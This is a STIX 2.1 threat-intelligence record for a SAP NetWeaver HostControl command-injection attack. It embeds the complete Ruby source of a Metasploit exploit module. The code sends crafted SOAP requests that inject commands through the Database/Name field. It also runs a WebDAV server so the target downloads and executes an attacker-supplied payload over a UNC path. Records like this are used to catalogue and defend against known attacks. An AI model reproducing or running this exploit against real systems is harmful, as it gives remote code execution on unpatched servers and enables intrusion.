{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2bb7745-f1eb-4f44-b2fd-dd82facc9a91",
    "created": "2024-08-14T16:52:22.432429Z",
    "modified": "2024-08-14T16:52:22.432433Z",
    "name": "SAP NetWeaver HostControl Command Injection",
    "description": " This module exploits a command injection vulnerability in the SAPHostControl Service, by sending a specially crafted SOAP request to the management console.  In order to deal with the spaces and length limitations, a WebDAV service is created to run an arbitrary payload when accessed as a UNC path. Because of this the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sap_host_control_cmd_exec.rb",
            "external_id": "sap_host_control_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.contextis.com/research/blog/sap4/"
        },
        {
            "source_name": "reference",
            "url": "https://websmp130.sap-ag.de/sap/support/notes/1341333#AuthenticationRequired"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        \t=> 'SAP NetWeaver HostControl Command Injection',\n      'Description'   => %q{\n          This module exploits a command injection vulnerability in the SAPHostControl\n        Service, by sending a specially crafted SOAP request to the management console.\n\n        In order to deal with the spaces and length limitations, a WebDAV service is\n        created to run an arbitrary payload when accessed as a UNC path. Because of this,\n        the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.\n        It is enabled and automatically started by default on Windows XP SP3, but disabled\n        by default on Windows 2003 SP2.\n      },\n      'Author'      => [\n        'Michael Jordon', # Vulnerability discovery and PoC\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'OSVDB', '84821'],\n          [ 'URL', 'http://www.contextis.com/research/blog/sap4/' ],\n          [ 'URL', 'https://websmp130.sap-ag.de/sap/support/notes/1341333' ] # Authentication Required\n        ],\n      'Targets'     =>\n        [\n          [ 'SAP NetWeaver 7.02 SP6 / Windows with WebClient enabled', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Aug 14 2012'\n    )\n    register_options(\n      [\n        Opt::RPORT(1128),\n        OptString.new('URIPATH',   [ true, \"The URI to use (do not change)\", \"/\" ]),\n        OptPort.new('SRVPORT',     [ true, \"The daemon port to listen on (do not change)\", 80 ]),\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n      when 'OPTIONS'\n        process_options(cli, request)\n      when 'PROPFIND'\n        process_propfind(cli, request)\n      when 'GET'\n        process_get(cli, request)\n      else\n        vprint_status(\"#{request.method} => 404 (#{request.uri})\")\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n    end\n  end\n\n  def process_get(cli, request)\n\n    if blacklisted_path?(request.uri)\n      vprint_status(\"GET => 404 [BLACKLIST] (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      cli.send_response(resp)\n      return\n    end\n\n    if (request.uri.include? @basename)\n      print_status(\"GET => Payload\")\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Treat index.html specially\n    if (request.uri[-1,1] == \"/\" or request.uri =~ /index\\.html?$/i)\n      vprint_status(\"GET => REDIRECT (#{request.uri})\")\n      resp = create_response(200, \"OK\")\n\n      resp.body = %Q|<html><head><meta http-equiv=\"refresh\" content=\"0;URL=#{@exploit_unc}#{@share_name}\\\\\"></head><body></body></html>|\n\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n      return\n    end\n\n    # Anything else is probably a request for a data file...\n    vprint_status(\"GET => DATA (#{request.uri})\")\n    data = \"HELLO!\"\n    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    vprint_status(\"PROPFIND #{path}\")\n\n    if path !~ /\\/$/\n\n      if blacklisted_path?(path)\n        vprint_status \"PROPFIND => 404 (#{path})\"\n        resp = create_response(404, \"Not Found\")\n        resp.body = \"\"\n        cli.send_response(resp)\n        return\n      end\n\n      if path.index(\".\")\n        vprint_status \"PROPFIND => 207 File (#{path})\"\n        body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n        # send the response\n        resp = create_response(207, \"Multi-Status\")\n        resp.body = body\n        resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n        cli.send_response(resp)\n        return\n      else\n        vprint_status \"PROPFIND => 301 (#{path})\"\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    vprint_status \"PROPFIND => 207 Directory (#{path})\"\n    body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n  <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n      <D:prop>\n        <lp1:resourcetype><D:collection/></lp1:resourcetype>\n        <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n        <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n        <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n        <D:supportedlock>\n          <D:lockentry>\n            <D:lockscope><D:exclusive/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n          <D:lockentry>\n            <D:lockscope><D:shared/></D:lockscope>\n            <D:locktype><D:write/></D:locktype>\n          </D:lockentry>\n        </D:supportedlock>\n        <D:lockdiscovery/>\n        <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n      </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n  </D:propstat>\n</D:response>\n|\n\n    if request[\"Depth\"].to_i > 0\n      trail = path.split(\"/\")\n      trail.shift\n      case trail.length\n        when 0\n          body << generate_shares(path)\n        when 1\n          body << generate_files(path)\n      end\n    else\n      vprint_status \"PROPFIND => 207 Top-Level Directory\"\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def generate_shares(path)\n    share_name = @share_name\n    %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{share_name}/</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n|\n  end\n\n  def generate_files(path)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    base  = @basename\n    exts  = @extensions.gsub(\",\", \" \").split(/\\s+/)\n    files = \"\"\n    exts.each do |ext|\n      files << %Q|\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}#{base}.#{ext}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n<lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n<lp2:executable>T</lp2:executable>\n<D:supportedlock>\n<D:lockentry>\n<D:lockscope><D:exclusive/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n<D:lockentry>\n<D:lockscope><D:shared/></D:lockscope>\n<D:locktype><D:write/></D:locktype>\n</D:lockentry>\n</D:supportedlock>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n<D:ishidden b:dt=\"boolean\">1</D:ishidden>\n</D:propstat>\n</D:response>\n|\n    end\n\n    files\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  # This method rejects requests that are known to break exploitation\n  def blacklisted_path?(uri)\n    share_path = \"/#{@share_name}\"\n    payload_path = \"#{share_path}/#{@basename}.exe\"\n    case uri\n      when payload_path\n        return false\n      when share_path\n        return false\n      else\n        return true\n    end\n  end\n\n  def check\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n  <SOAP-ENV:Header>\n    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\">\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n  <SOAP-ENV:Body>\n    <ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>\n      <aArguments>\n        <item>\n          <mKey>Database/Type</mKey>\n          <mValue>ada</mValue>\n        </item>\n        <item>\n          <mKey>Database/Password</mKey>\n          <mValue>#{rand_text_alphanumeric(8)}</mValue>\n        </item>\n        <item>\n          <mKey>Database/Username</mKey>\n          <mValue>control</mValue>\n        </item>\n        <item>\n          <mKey>Database/Name</mKey>\n          <mValue>NSP \\-o c:\\\\#{rand_text_alpha_lower(4)}.txt \\-n #{rand_text_alpha_lower(8)}\n!#{rand_text_alpha_lower(8)}\n</mValue>\n        </item>\n      </aArguments>\n    </ns1:GetDatabaseStatus>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n    eos\n\n    print_status(\"Testing command injection...\")\n\n    res = send_request_cgi({\n      'uri'          => '/',\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t   => {\n        'SOAPAction' => \"\\\"\\\"\",\n      },\n      'data'         => soap,\n    }, 10)\n\n    if (res and res.code == 500 and res.body =~ /Generic error/)\n      return CheckCode::Vulnerable\n    else\n      return CheckCode::Safe\n    end\n\n  end\n\n  def exploit\n\n    @basename = rand_text_alpha(3)\n    @share_name = rand_text_alpha(3)\n    @extensions = \"exe\"\n    @system_commands_file = rand_text_alpha_lower(4)\n\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']\n\n    @exploit_unc  = \"\\\\\\\\#{myhost}\\\\\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    vprint_status(\"Payload available at #{@exploit_unc}#{@share_name}\\\\#{@basename}.exe\")\n\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n  <SOAP-ENV:Header>\n    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\">\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n  <SOAP-ENV:Body>\n    <ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>\n      <aArguments>\n        <item>\n          <mKey>Database/Type</mKey>\n          <mValue>ada</mValue>\n        </item>\n        <item>\n          <mKey>Database/Password</mKey>\n          <mValue>#{rand_text_alphanumeric(8)}</mValue>\n        </item>\n        <item>\n          <mKey>Database/Username</mKey>\n          <mValue>control</mValue>\n        </item>\n        <item>\n          <mKey>Database/Name</mKey>\n          <mValue>NSP \\-o c:\\\\#{@system_commands_file}.txt \\-n #{rand_text_alpha_lower(8)}\n!#{@exploit_unc}#{@share_name}\\\\#{@basename}.exe\n</mValue>\n        </item>\n      </aArguments>\n    </ns1:GetDatabaseStatus>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n    eos\n\n    print_status(\"Injecting system commands...\")\n\n    res = send_request_cgi({\n      'uri'          => '/',\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t   => {\n        'SOAPAction'     => \"\\\"\\\"\",\n      },\n      'data'         => soap,\n    }, 10)\n\n    if (res and res.code == 500 and res.body =~ /Generic error/)\n      print_good(\"System command successfully injected\")\n    else\n      print_error(\"Failed to inject system command\")\n      return\n    end\n\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n  <SOAP-ENV:Header>\n    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\">\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n  <SOAP-ENV:Body>\n    <ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>\n      <aArguments>\n        <item>\n          <mKey>Database/Type</mKey>\n          <mValue>ada</mValue>\n        </item>\n        <item>\n          <mKey>Database/Password</mKey>\n          <mValue>#{rand_text_alphanumeric(8)}</mValue>\n        </item>\n        <item>\n          <mKey>Database/Username</mKey>\n          <mValue>control</mValue>\n        </item>\n        <item>\n          <mKey>Database/Name</mKey>\n          <mValue>NSP \\-ic c:\\\\#{@system_commands_file}.txt</mValue>\n        </item>\n      </aArguments>\n    </ns1:GetDatabaseStatus>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n    eos\n\n    print_status(\"Executing injected command\")\n\n    res = send_request_cgi({\n      'uri'          => '/',\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t   => {\n        'SOAPAction'     => \"\\\"\\\"\",\n      },\n      'data'         => soap,\n    }, 1)\n\n    if res\n      print_error(\"Failed to execute injected command\")\n      return\n    end\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "Aug 14 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}